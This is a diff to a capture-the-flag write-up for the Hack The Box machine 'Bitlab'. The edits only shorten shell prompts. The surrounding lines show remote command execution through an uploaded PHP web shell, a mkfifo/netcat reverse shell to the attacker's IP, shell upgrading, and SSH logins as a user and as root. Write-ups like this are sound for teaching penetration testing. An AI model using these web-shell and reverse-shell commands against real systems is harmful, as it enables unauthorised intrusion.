@@ -203,14 +203,14 @@ Looking at master branch now it had my script.
 
 Now I have RCE on the server
 
-    root@kali:~/files/htb/boxes/bitlab# curl http://10.10.10.114/profile/yuns.php?cmd=id
+    root@kali:# curl http://10.10.10.114/profile/yuns.php?cmd=id
     uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 using this reverse shell i got my first shell.
 
     rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.172 9001 >/tmp/f
 
-    root@kali:~/files# nc -lvnp 9001
+    root@kali:# nc -lvnp 9001
     Ncat: Version 7.80 ( https://nmap.org/ncat )
     Ncat: Listening on :::9001
     Ncat: Listening on 0.0.0.0:9001
@@ -224,8 +224,8 @@ Getting a full TTY with tab auto compilation.
     $ python -c 'import pty;pty.spawn("/bin/bash")'
     www-data@bitlab:/var/www/html/profile$ ^Z
     [1]+  Stopped                 nc -lvnp 9001
-    root@kali:~/files# stty raw -echo
-    root@kali:~/files# nc -lvnp 9001 # Enterting fg Here
+    root@kali:# stty raw -echo
+    root@kali:# nc -lvnp 9001 # Enterting fg Here
 
     www-data@bitlab:/var/www/html/profile$ who
     who     whoami
@@ -278,7 +278,7 @@ Clave's credentials.
 
 Trying them with SSH.I logged in and got user.txt
 
-    root@kali:~/files/htb/boxes/bitlab# ssh clave@10.10.10.114
+    root@kali:# ssh clave@10.10.10.114
     clave@10.10.10.114's password:
     Last login: Tue Sep 10 14:44:29 2019 from 10.10.15.230
     clave@bitlab:~$ cat user.txt
@@ -293,7 +293,7 @@ Looking at Clave's directory there was RemoteConnection.exe
 
 So I copied it to box to do some analysis on it.
 
-    root@kali:~/files/htb/boxes/bitlab# scp clave@10.10.10.114:~/RemoteConnection.exe .
+    root@kali:# scp clave@10.10.10.114:~/RemoteConnection.exe .
     clave@10.10.10.114's password:
     RemoteConnection.exe                                                                                                    100%   14KB  66.8KB/s   00:00
 
@@ -329,7 +329,7 @@ I can see the prameters in EBX register.
 
 Logging in as root
 
-    root@kali:~/files/htb/boxes/bitlab# ssh root@10.10.10.114
+    root@kali:# ssh root@10.10.10.114
     root@10.10.10.114's password:
     Last login: Tue Sep 10 14:44:29 2019
     root@bitlab:~# cat root.txt
@@ -372,7 +372,7 @@ Creating reverse shell in post-merge
 
 On my listener
 
-    root@kali:/opt/static-binaries/windows# nc -lvnp 9001
+    root@kali:# nc -lvnp 9001
     Ncat: Version 7.80 ( https://nmap.org/ncat )
     Ncat: Listening on :::9001
     Ncat: Listening on 0.0.0.0:9001
